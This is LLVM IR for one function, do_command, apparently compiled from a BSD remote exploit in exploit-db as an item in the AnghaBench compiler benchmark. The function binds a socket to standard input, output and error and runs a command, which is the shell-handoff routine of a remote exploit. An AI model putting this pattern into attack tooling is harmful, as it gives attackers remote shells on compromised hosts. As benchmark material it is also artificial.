; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_234.c_do_command.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_234.c_do_command.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@command_type = common dso_local global i64 0, align 8
@CMD_LOCAL = common dso_local global i64 0, align 8
@command = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @do_command(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca [1024 x i8], align 16
  %4 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %5 = load i64, i64* @command_type, align 8
  %6 = load i64, i64* @CMD_LOCAL, align 8
  %7 = icmp eq i64 %5, %6
  br i1 %7, label %8, label %19

8:                                                ; preds = %1
  %9 = load i32, i32* %2, align 4
  %10 = call i32 @dup2(i32 %9, i32 0)
  %11 = load i32, i32* %2, align 4
  %12 = call i32 @dup2(i32 %11, i32 1)
  %13 = load i32, i32* %2, align 4
  %14 = call i32 @dup2(i32 %13, i32 2)
  %15 = load i8*, i8** @command, align 8
  %16 = load i8*, i8** @command, align 8
  %17 = call i32 @execl(i8* %15, i8* %16, i32* null)
  %18 = call i32 @exit(i32 2) #3
  unreachable

19:                                               ; preds = %1
  %20 = load i32, i32* %2, align 4
  %21 = load i8*, i8** @command, align 8
  %22 = load i8*, i8** @command, align 8
  %23 = call i32 @strlen(i8* %22)
  %24 = call i32 @write(i32 %20, i8* %21, i32 %23)
  %25 = load i32, i32* %2, align 4
  %26 = call i32 @write(i32 %25, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0), i32 1)
  br label %27

27:                                               ; preds = %32, %19
  %28 = load i32, i32* %2, align 4
  %29 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %30 = call i32 @read(i32 %28, i8* %29, i32 1024)
  store i32 %30, i32* %4, align 4
  %31 = icmp sgt i32 %30, 0
  br i1 %31, label %32, label %36

32:                                               ; preds = %27
  %33 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %34 = load i32, i32* %4, align 4
  %35 = call i32 @write(i32 1, i8* %33, i32 %34)
  br label %27

36:                                               ; preds = %27
  %37 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @dup2(i32, i32) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
